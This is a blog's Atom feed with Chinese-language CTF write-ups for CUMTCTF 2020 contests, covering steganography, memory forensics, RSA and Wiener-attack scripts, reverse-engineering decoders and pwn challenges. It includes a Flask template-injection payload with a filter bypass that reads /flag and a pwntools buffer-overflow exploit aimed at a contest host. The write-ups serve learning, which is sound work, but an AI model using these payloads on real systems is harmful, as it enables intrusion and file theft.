<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://7usai.github.io</id>
    <title>7usai</title>
    <updated>2020-11-23T02:53:22.711Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://7usai.github.io"/>
    <link rel="self" href="https://7usai.github.io/atom.xml"/>
    <subtitle>7usai&apos;blog</subtitle>
    <logo>https://7usai.github.io/images/avatar.png</logo>
    <icon>https://7usai.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 7usai</rights>
    <entry>
        <title type="html"><![CDATA[寒假之前的计划（re_wp暂时存为草稿防止作业抄袭）]]></title>
        <id>https://7usai.github.io/post/LNWC1dDnX/</id>
        <link href="https://7usai.github.io/post/LNWC1dDnX/">
        </link>
        <updated>2020-11-15T15:05:51.000Z</updated>
        <content type="html"><![CDATA[<p>①复习信安数学，网安，认真学习密码学以及网安实验<br>
②看一遍加密与解密，基本了解<br>
③学透网安课本<br>
④背单词并看一遍高数课本，复习计网相关知识<br>
⑤暂时停止CTF学习<br>
⑥读linux二进制分析<br>
⑦少喝酒，跳绳</p>
<p>ps:寒假之前应该不会更新了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTCTF2020华为杯决赛]]></title>
        <id>https://7usai.github.io/post/tHs44F2g1/</id>
        <link href="https://7usai.github.io/post/tHs44F2g1/">
        </link>
        <updated>2020-10-21T15:54:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cumtctf2020华为杯">CUMTCTF2020华为杯</h1>
<p>[TOC]</p>
<h2 id="misc">misc</h2>
<h3 id="signin">SignIn</h3>
<p>十六进制编译器打开，复制后base64解码，在brainfuck解码，得flag=CUMTCTF{Welcome_to_CUMTCTF_2020_Final}</p>
<h3 id="出个流量分析题吧">出个流量分析题吧</h3>
<p>wireshark打开，搜索flag字符串就找到</p>
<h3 id="出个lsb吧">出个LSB吧</h3>
<p>解压发现是个图片，用stegsolve打开，发现在red/green/blue plane0 上方有不明黑色块，在analyse中打开data extract，勾选三个0，save bin 以png格式保存，得到一张二维码</p>
<h3 id="出个文档吧">出个文档吧</h3>
<p>打开docx文件，明文是摩斯密码，解密得FLAG IS NOT HERE，提示flag不是这个。猜测是文件隐写，检查文档发现隐藏的flag:</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1603788730325.jpg" alt="" loading="lazy"></figure>
<h3 id="出个伪web吧">出个伪web吧</h3>
<p>就硬照，找到后加上flag{}</p>
<h3 id="出个压缩包吧">出个压缩包吧</h3>
<p>解压得到的flag.rar文件放入十六进制编译器后，发现其中有个隐藏的secret.png，其中头文件错了，将7A改为74</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1603788744549.png" alt="" loading="lazy"></figure>
<p>得到的secret.png放入十六进制编译器后</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1603788753774.png" alt="" loading="lazy"></figure>
<p>文件后缀改为gif后放入stegsolve</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1603788760915.png" alt="" loading="lazy"></figure>
<p>发现只有一半，分离图层</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1603788769865.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1603788779016.png" alt="" loading="lazy"></figure>
<p>补全左上角和右上角扫描得flag</p>
<h3 id="出个内存取证吧">出个内存取证吧</h3>
<p>得到一份镜像文件，用Volatility进行分析</p>
<p>分析镜像：volatility -f memory.img imageinfo</p>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1603788789704.png" alt="" loading="lazy"></figure>
<p>猜测profile值为Win2003SP1x86</p>
<p>查看进程：volatility -f memory.img --profile=Win2003SP1x86 pslist</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1603788798868.png" alt="" loading="lazy"></figure>
<p>发现一个DumpIT.exe</p>
<p>查看之前运行过的进程： volatility -f memory.img --profile=Win2003SP1x86 userassist<br>
提取explorer.exe进程：volatility -f memory.img --profile=Win2003SP1x86 memdump -p 1992 --dump-dir=./</p>
<p>得到1992.dmp文件，然后foremost 1992.dmp -T提取</p>
<p>在png文件夹里里发现了4个图片</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1603788809653.png" alt="" loading="lazy"></figure>
<p>扫描得jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p>
<p>有key值和vi，为AES加密</p>
<p>http://tool.chacuo.net/cryptaes</p>
<h2 id="crypto">Crypto</h2>
<h3 id="classical">Classical</h3>
<p>vigenere密码</p>
<p>https://www.guballa.de/vigenere-solver</p>
<h3 id="earsa">eaRSA</h3>
<p>winner attack</p>
<p>网上找的轮子，直接跑脚本就得出flag</p>
<h2 id="web">Web</h2>
<h3 id="doge">doge</h3>
<p>真签到题，抽个奖就给出了flag</p>
<h3 id="babyflask">babyflask</h3>
<p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
<p>就是了模板注入</p>
<pre><code>url+{{7*7}}
</code></pre>
<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
<pre><code>{{''.__class__.__mro__[2].__subclasses__()}}
查看模块时，发现存在waf
经过测试发现是过滤了[]
于是使用
{{''.__class__.__mro__.__getitem__(2).__subclasses__()}}
存在file模块
用read读取文件内容
exp:
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag').read()  
</code></pre>
<h2 id="re">re</h2>
<h3 id="hello_world">hello_world</h3>
<p>无壳，64位，直接放入IDA</p>
<p>关键函数</p>
<pre><code>signed __int64 __fastcall sub_40156F(const char *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  int i; // [rsp+2Ch] [rbp-54h]
  __int64 v7; // [rsp+60h] [rbp-20h]

  v7 = a4;
  for ( i = 0; i &lt; strlen(a1); ++i )
  {
    a2 = byte_403020[i];
    a1 = *(i + v7);
    if ( a2 != (a1 ^ aIsEasyRight[i % strlen(a1)]) )
    {
      sub_401530();
      printf(a1, a2, v4, &quot;wrong!!!&quot;);
      return 0LL;
    }
  }
  printf(a1, a2, &quot;you got it!!!&quot;, &quot;%s&quot;);
  return 1LL;
}
</code></pre>
<p>简单的异或，aIsEasyRight和byte_403020值已知，</p>
<p>脚本</p>
<pre><code>a=[  0x2A, 0x26, 0x12, 0x31, 0x1A, 0x07, 0x11, 0x3A, 0x2D, 0x0F,
  0x0E, 0x1A, 0x41, 0x4B, 0x36, 0x43, 0x31, 0x00, 0x3E, 0x16,
  0x17, 0x35, 0x1D, 0x10, 0x38, 0x11, 0x44, 0x4A, 0x1B, 0x2C,
  0x2B, 0x17, 0x50, 0x03, 0x04]
print(len(a))
b='is_easy_right?is_easy_right?is_easy_right?'
print(len(b))
c=''
for i in range(len(a)):
    c+=chr(ord(b[i])^a[i])
print (c)
</code></pre>
<p>得flag=CUMT{the_fir5t_0ne_enjoy_y0ur_tr1p}</p>
<h3 id="non_name">non_name</h3>
<p>无壳，64位</p>
<p>关键函数</p>
<pre><code>signed __int64 sub_401530()
{
  signed int j; // [rsp+8h] [rbp-8h]
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i &lt;= 3; ++i )
  {
    dword_407044 = 0;
    for ( j = 0; j &lt;= 3; ++j )
      dword_407044 += byte_403010[4 * i + j] * byte_40703E[j];
    if ( dword_403020[i] != dword_407044 )
      return 0LL;
  }
  return 1LL;
}
</code></pre>
<p>稍微改一下</p>
<pre><code>signed __int64 sub_401530()
{
  signed int j; // [rsp+8h] [rbp-8h]
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i &lt;= 3; ++i )
  {
    dword_407044 = 0;
    for ( j = 0; j &lt;= 3; ++j )
      dword_407044 += a[4 * i + j] * flag[j];
    if ( b[i] != dword_407044 )
      return 0LL;
  }
  return 1LL;
}
</code></pre>
<p>通过b和a中得数已知，相当于循环4次，每次b[i]=a[4 * i +j] * flag[j] + a[4 * i +j+1] * flag[j+1] + a[4 * i +j+2] * flag[j+2] + a[4 * i +j+3] * flag[j+3]，相当于如下线性方程组</p>
<figure data-type="image" tabindex="10"><img src="F:%5Cmarkdown%5CTypora%5CSAVES%5Cblog%E5%9B%BE%E7%89%87%5C042014092413.gif" alt="线性方程组" loading="lazy"></figure>
<p>其中x为flag</p>
<p>可以直接在线网站求解的4个十进制数</p>
<p>https://www.buildenvi.com/gongju/formula/3lck4</p>
<p>再转为hex得flag</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1603788824640.png" alt="" loading="lazy"></figure>
<p>用z3或者matlab是最好的，这里给出z3脚本</p>
<pre><code>from z3 import *
s=Solver()
x1,x2,x3,x4=Ints(&quot;x1 x2 x3 x4&quot;)
s.add(0x2534 == 0x0c*x1+0x20*x2+0x22*x3+0x0c*x4)
s.add(0x1AFF == 0x35*x1+0x01*x2+0x02*x3+0x04*x4)
s.add(0x2786 == 0x06*x1+0x08*x2+0x22*x3+0x2D*x4)
s.add(0x5B44 == 0x38*x1+0x20*x2+0x55*x3+0x2B*x4)
flag=[]

if s.check() == sat:
    ans = s.model()
    flag.append(ans[x1])
    flag.append(ans[x2])
    flag.append(ans[x3])
    flag.append(ans[x4])
print(flag)
</code></pre>
<h2 id="pwn">pwn</h2>
<h3 id="login">login</h3>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.os='linux'
#r=process('./login')
r=remote('219.219.61.234',10000)
#gdb.attach(r)
r.recvuntil(&quot;choice: &quot;)
r.sendline(&quot;1&quot;)
r.recvuntil(&quot;Enter your username(length less than 20):&quot;)
r.sendline('aaaa')
r.recvuntil(&quot;Enter your password(length less than 20):&quot;)
payload='a'*0x48+p64(0x004009F7)
r.send(payload)
r.interactive()
</code></pre>
<h3 id="login_plus">login_plus</h3>
<p>将__int 64 的数付给 int 的数，存在整数溢出，输入 4294967296，就可以拿到 flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMT校赛200923]]></title>
        <id>https://7usai.github.io/post/lgs4SdGy2/</id>
        <link href="https://7usai.github.io/post/lgs4SdGy2/">
        </link>
        <updated>2020-09-27T11:08:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cumt校赛">CUMT校赛</h1>
<p>[TOC]</p>
<h2 id="crypto">Crypto</h2>
<h3 id="幼儿园的密码题">幼儿园的密码题</h3>
<h4 id="脚本">脚本</h4>
<p>已知n求p,q</p>
<p>http://www.factordb.com/</p>
<p>n,e,c转成10进制</p>
<pre><code>import gmpy2
p=324350545929838254331191385863847627003
q=328413456989577256301798468872388310877
n=106521084065274837947153338013414677016150003618052696631715598225251903811631
c=40448992051548719008529549070468060415257485938698092782029814901918646701101
e=65537
d = gmpy2.invert(e,(p-1)*(q-1))
key=pow(c, d, n)
print(d)
print(key)
</code></pre>
<p>得出来的key转十六进制再转字符(真的真的很没意思)</p>
<h3 id="小学生的密码题">小学生的密码题</h3>
<pre><code>from secret import flag
def encode(ptext):
    dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]   		;dic='ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_'abcdefghijklmnopqrstuvwxyz{|}~
    m = [i for i in ptext]					;m=flag
    tmp = [];s = []						创建临时tmp和s
    for i in range(len(m)):					;range(flag长度)	
        for j in range(len(dic)):					;range(62)
            if m[i] == dic[j]:					;flag[i]==dic[j] 即为A到~时
                tmp.append(j + 1)					;tmp+=j+1(相当于ord(dic[j])-63)
    for i in tmp:						;遍历tmp中的数
        res = &quot;&quot;						
        if i &gt;= 8:						i&gt;=8(dic[j]&gt;=71时)	
            res += int(i/8)*&quot;8&quot;
        if i%8 &gt;=4:						i%8&gt;=4	
            res += int(i%8/4)*&quot;4&quot;					
        if i%4 &gt;=2:						
            res += int(i%4/2)*&quot;2&quot;
        if i%2 &gt;= 1:						
            res += int(i%2/1)*&quot;1&quot;
        s.append(res + &quot;0&quot;)
    print (&quot;&quot;.join(s)[:-1])
encode(flag)
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1601204975990.png" alt="" loading="lazy"></figure>
<p>硬算，算到一半发现加法就行，淦</p>
<h4 id="脚本-2">脚本</h4>
<pre><code>a=[2,20,12,19,2,19,5,58,24,46,52,30,32,49,36,30,17,40,38,39,51,60]
b=[67,85,77,84,67,84,70,123,89,111,117,95,97,114,101,95,82,105,103,104,116,125]
flag=''
for i in range(22):
    flag+=chr(b[i])
    print(flag)
</code></pre>
<p>a=上边一坨-1</p>
<p>b=a+65</p>
<p>得flag=CUMTCTF{You_are_Right}</p>
<h3 id="初中生的密码题">初中生的密码题</h3>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1601205029628.png" alt="" loading="lazy"></figure>
<p>先用z3求出来p和q的值，最后正常计算鸡号</p>
<h4 id="脚本-3">脚本</h4>
<pre><code>from z3 import *
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
#x=p-q
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
p=Int('p')
solve((p-x)*p==n)
q=Int('q')
solve((q+x)*q==n)
import gmpy2
from Crypto.Util.number import long_to_bytes
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
e=65537
p=30697352531330434856674588715905741896538207322123455679076478093195252240812032665803037835289865152784098077605359655486723575203621508201904205626825328632340569805064205047909749046701590344754257018324448436810374908046833801210988143008924043901109029730458966709669708451252061195235570558910738154083634093497318083877286614306923427160713075752860556509004687350746768578465885884145482528431003386829431965250868646361821676571510726939416897822283852421262616728229663652002544064443613737966055339522820176866519596663623744466631149567795708311336148219848210798881176646765091102193180034355210912558857
q=27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221
phi=(p-1)*(q-1)
d=gmpy2.invert(e,phi)
m=pow(c,d,n)
print (long_to_bytes(m))
</code></pre>
<h3 id="维也纳的秘密">维也纳的秘密</h3>
<p>wieners'attack</p>
<h4 id="脚本-4">脚本</h4>
<pre><code>e=25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193
n=106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819
c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160
import gmpy2
from Crypto.Util.number import long_to_bytes


def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res


def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回


# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
    return res


def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2


def wienerAttack(e, n):
    for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue

        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print(&quot;该方法不适用&quot;)
d=wienerAttack(e,n)
print(&quot;d=&quot;,d)
key=pow(c, d, n)
print(key)
key1=long_to_bytes(key)
print(key1)
</code></pre>
<h3 id="我只吃素">我只吃素</h3>
<h4 id="脚本-5">脚本</h4>
<pre><code>from Crypto.Util.number import long_to_bytes
s=open('F:/markdown/Typora/SAVES/校赛题目/20200923/Crypto/我只吃素.txt','r').read()
b = [3,5,7,11,13,17,19,23,29,31]
for i in b:
    s=int(s,i)
    s=hex(s)[2:]
    s=bytes.fromhex(s).decode()
dic={}
for i in range(10):
    dic[chr(ord('0')+i)]=i
for i in range(26):
    dic[chr(ord('a') + i)] = i+10
for i in range(26):
    dic[chr(ord('A') + i)] = i+10+26
print(dic)

def change(s, k):
    j=0
    res=0
    for i in range(len(s)):
        res += dic[s[len(s) - i - 1]] * pow(k, j)
        j+=1
    return res
c = [37, 41, 43, 47, 53, 59, 61]
for j in c:
    s=change(s,j)
    s=hex(s)[2:]
    c=s
    s = bytes.fromhex(s).decode()
ss=int(c,16)
print(long_to_bytes(ss))
print(s)
</code></pre>
<h2 id="re">RE</h2>
<h3 id="re1">re1</h3>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1601205060940.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1601205069100.png" alt="" loading="lazy"></figure>
<h3 id="re2">re2</h3>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1601205077620.png" alt="" loading="lazy"></figure>
<p>脱壳机脱壳</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1601205085576.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1601205093318.png" alt="" loading="lazy"></figure>
<h3 id="re3">re3</h3>
<p>从python字节码可看出是存入一个数组cipher，再与19异或得flag</p>
<h4 id="脚本-6">脚本</h4>
<pre><code>cipher=[80,70,94,71,80,71,85,104,86,39,64,106,76,67,
   106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]
b=''
for i in range(29):
    b+=chr(cipher[i]^19)
    print(b)
</code></pre>
<h3 id="re4">re4</h3>
<p>无壳，32位</p>
<p>加密函数</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1601205154701.png" alt="" loading="lazy"></figure>
<p>存在v15的字符</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1601205183970.png" alt="" loading="lazy"></figure>
<p>正向脚本</p>
<pre><code>v15=[0x15,0x02,0x0A,0x16,0x13,0x0B,0x11,0x08,0x03,0x1B,0x19,0x21,0x12,0x1A,
     0x18,0x10,0x09,0x22,0x24,0x17,0x04,0x0E,0x0C,0x14,0x1E,0x00,0x1D,0x07,
     0x01,0x06,0x1F,0x0F,0x05,0x1C,0x0D,0x23,0x20,0x25]
a='eMl1_l1hT9_ldcoR3OC1CW0HhC_{UF30Tp__l}'
b=''
for j in range(len(v15)):
    b+=a[v15[j]]
    print(b)
</code></pre>
<p>其实a=flag[v15[j]]</p>
<p>逆向脚本不会写</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1601205194993.png" alt="" loading="lazy"></figure>
<p>再排序</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1601205201637.png" alt="" loading="lazy"></figure>
<h2 id="misc">Misc</h2>
<h3 id="连签到都算不上">连签到都算不上</h3>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1601205220371.png" alt="" loading="lazy"></figure>
<p>得</p>
<pre><code>\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u5e73\u7b49\u81ea\u7531\u8bda\u4fe1\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6cd5\u6cbb\u53cb\u5584\u5e73\u7b49\u5e73\u7b49\u6cd5\u6cbb\u548c\u8c10\u548c\u8c10\u516c\u6b63\u8bda\u4fe1\u6587\u660e\u516c\u6b63\u548c\u8c10\u548c\u8c10\u5bcc\u5f3a\u516c\u6b63\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u548c\u8c10\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u548c\u8c10\u6587\u660e\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6587\u660e\u6c11\u4e3b\u6cd5\u6cbb\u8bda\u4fe1\u548c\u8c10\u000d\u000a
</code></pre>
<p>继续转</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1601205241220.png" alt="" loading="lazy"></figure>
<p>继续转</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1601205251698.png" alt="" loading="lazy"></figure>
<h3 id="真签到题">真签到题</h3>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1601205294999.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1601205311610.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1601205326113.png" alt="" loading="lazy"></figure>
<h3 id="大鲨鱼之你可劲找">大鲨鱼之你可劲找</h3>
<p>这题真的很恶心<br>
<img src="https://7usai.github.io/post-images/1601205336893.png" alt="" loading="lazy"></p>
<p>先搜索flag，发现全是http</p>
<p>再缩小范围</p>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1601205347454.png" alt="" loading="lazy"></figure>
<p>这里可以看到是这样的sql语句</p>
<figure data-type="image" tabindex="19"><img src="https://7usai.github.io/post-images/1601205357377.png" alt="" loading="lazy"></figure>
<p>追踪http流</p>
<figure data-type="image" tabindex="20"><img src="https://7usai.github.io/post-images/1601205365585.png" alt="" loading="lazy"></figure>
<p>分为好几组，每一组确定一个十进制数，一组有好几段，每段后面都有一串字符，根据不同的字符判断是&gt;还是&lt;=，数就完事了，</p>
<figure data-type="image" tabindex="21"><img src="https://7usai.github.io/post-images/1601205375301.png" alt="" loading="lazy"></figure>
<h4 id="脚本-7">脚本</h4>
<pre><code>a=[99,101,99,99,49,51,57,52,45,54,49,51,51,45,52,51,
100,48,45,98,101,48,54,45,97,52,49,99,53,102,50,51,49,100,100,52,125]
b=''
for i in range(len(a)):
    b+=chr(a[i])
    print(b)
</code></pre>
<h3 id="别做题了听歌吧">别做题了听歌吧</h3>
<figure data-type="image" tabindex="22"><img src="https://7usai.github.io/post-images/1601205385896.jpg" alt="" loading="lazy"></figure>
<p>用MP3stego分离</p>
<figure data-type="image" tabindex="23"><img src="https://7usai.github.io/post-images/1601205396602.png" alt="" loading="lazy"></figure>
<p>得到这个</p>
<figure data-type="image" tabindex="24"><img src="https://7usai.github.io/post-images/1601205404190.png" alt="" loading="lazy"></figure>
<p>放入010editor</p>
<figure data-type="image" tabindex="25"><img src="https://7usai.github.io/post-images/1601205410895.png" alt="" loading="lazy"></figure>
<p>09为-，20为.，0D0A为\转化摩斯密码</p>
<figure data-type="image" tabindex="26"><img src="https://7usai.github.io/post-images/1601205417668.jpg" alt="" loading="lazy"></figure>
<h3 id="兔兔那么可爱">兔兔那么可爱</h3>
<p>以txt方式打开flag文件</p>
<figure data-type="image" tabindex="27"><img src="https://7usai.github.io/post-images/1601205424847.png" alt="" loading="lazy"></figure>
<p>斐波那契数列</p>
<h4 id="脚本-8">脚本</h4>
<pre><code>filename=&quot;C://Users/lenovo/Desktop/Misc3/flag.txt&quot;
fp=open(filename,&quot;r&quot;)
content=fp.read()
fp.close()
nterms = int(input(&quot;你需要几项？&quot;))
n1 = 0
n2 = 1
count = 2
if nterms &lt;= 0:
    print(&quot;请输入一个正整数。&quot;)
elif nterms == 1:
    print(&quot;斐波那契数列：&quot;)
    print(n1)
else:
    print(&quot;斐波那契数列：&quot;)
    print(n1, &quot;,&quot;, n2, end=&quot; , &quot;)
    while count &lt; nterms:
        nth = n1 + n2
        print(nth, end=&quot; , &quot;)
        print(content[nth-1])
        n1 = n2
        n2 = nth
        count += 1
</code></pre>
<p>得flag</p>
<h2 id="pwn">pwn</h2>
<h3 id="test_nc">test_nc</h3>
<p>nc一下加qq要flag</p>
